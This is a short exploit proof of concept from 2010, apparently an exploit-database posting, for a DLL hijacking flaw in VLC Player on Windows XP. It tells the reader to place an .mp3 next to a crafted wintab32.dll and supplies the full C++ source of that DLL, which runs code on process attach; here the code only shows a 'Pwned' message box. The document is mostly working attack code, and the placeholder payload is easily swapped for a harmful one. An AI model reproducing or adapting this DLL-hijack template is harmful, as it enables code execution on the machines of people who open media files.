/*Exploit Title: VLC Player DLL Hijack Vulnerability
Date: 25 Aug 2010
Author: Secfence
Version: VLC
Tested on: Windows XP

Place a .mp3 file and wintab32.dll in same folder and execute .mp3 file in
vlc player.

Code for wintab32.dll:

----------*/

/* wintab32.cpp */

#include "stdafx.h"
#include "dragon.h"

void init() {
MessageBox(NULL,"Pwned", "Pwned!",0x00000003);
}


BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
 init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}

/*----------


Exploit By:
Vinay Katoch
www.secfence.com
*/